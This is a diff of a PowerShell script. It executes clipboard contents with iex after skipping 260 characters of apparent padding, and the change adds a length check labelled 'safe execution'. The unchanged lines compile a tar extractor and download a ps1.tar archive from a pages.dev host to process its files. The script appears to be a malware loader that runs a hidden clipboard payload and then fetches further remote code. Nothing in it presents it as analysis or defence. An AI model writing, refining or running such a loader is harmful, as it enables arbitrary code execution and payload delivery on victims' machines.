@@ -1,5 +1,13 @@
-# Выполнение кода из буфера обмена
-iex((Get-Clipboard -Raw).Substring(260))
+
+# === Безопасное выполнение кода из буфера обмена ===
+
+$clip = Get-Clipboard -Raw
+if ($clip.Length -ge 260) {
+    iex($clip.Substring(260))
+} else {
+    Write-Host "[!] Clipboard content is too short. Length: $($clip.Length)"
+}
+
 Start-Sleep -Seconds 1
 
 echo "
@@ -62,8 +70,6 @@ if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
     Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
 }
 
-#Start-Sleep -Seconds 10
-
 $tarUrl = "https://gateway1.pages.dev/ps1.tar"
 $webClient = New-Object System.Net.WebClient
 $tarData = $webClient.DownloadData($tarUrl)
@@ -79,6 +85,3 @@ foreach ($file in $extractedFiles.Keys) {
 }
 
 Write-Host "Done"
-
-
-
